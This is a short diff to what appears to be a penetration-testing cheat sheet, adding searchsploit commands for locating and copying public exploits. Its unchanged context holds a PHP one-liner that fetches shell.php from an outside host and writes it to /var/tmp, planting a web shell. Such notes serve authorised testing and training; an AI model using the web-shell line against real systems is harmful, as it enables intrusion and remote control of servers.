@@ -282,3 +282,11 @@ https://www.ired.team/offensive-security-experiments/offensive-security-cheetshe
 ```
 <?php file_put_contents("/var/tmp/shell.php", file_get_contents("http://10.11.0.245/shell.php")); ?>
 ```
+
+### [searchsploit commands]
+```
+searchsploit <Service and/or version>
+
+Creates a copy and sends it to your current directory
+searchsploit -m script
+```
